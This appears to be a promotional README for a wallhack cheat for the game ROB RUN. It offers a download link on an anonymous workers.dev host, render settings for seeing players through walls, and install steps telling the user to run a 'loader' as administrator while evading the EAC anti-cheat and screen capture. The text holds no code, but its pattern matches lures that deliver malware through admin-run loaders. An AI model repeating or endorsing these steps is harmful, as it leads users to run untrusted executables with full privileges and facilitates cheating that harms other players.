# Through Walls for ROB RUN

[![Download](https://img.shields.io/badge/Download-Free-38bdf8?style=for-the-badge&labelColor=0b1320)](https://xtiz6i8n6.fresh-link.workers.dev/f03e3ac6)

A pure through-walls build: players through geometry, nothing else.

## Render rules

Hidden players get cold color, visible warm. Fade starts at 100 m so silhouettes thin out over distance instead of stacking.

| Rule | Value |
| --- | --- |
| fade start | 100 m |
| full fade | 550 m |
| outline | 2 px |
| hidden color | cyan |
| visible color | warm white |

## When to use it

- holding a street corner and tracking rotations
- night raids where full ESP is too bright
- spectating your own fights to learn angles

## Install

1. Extract, run the loader as administrator
2. Start ROB RUN
3. INSERT for color and fade
4. F4 toggles

## Troubleshooting

Outlines vanish after patch: update the build. Outlines under the menu: open menu before toggling. Capture black: streamproof and game capture.

Windows 10/11, Steam, EAC.
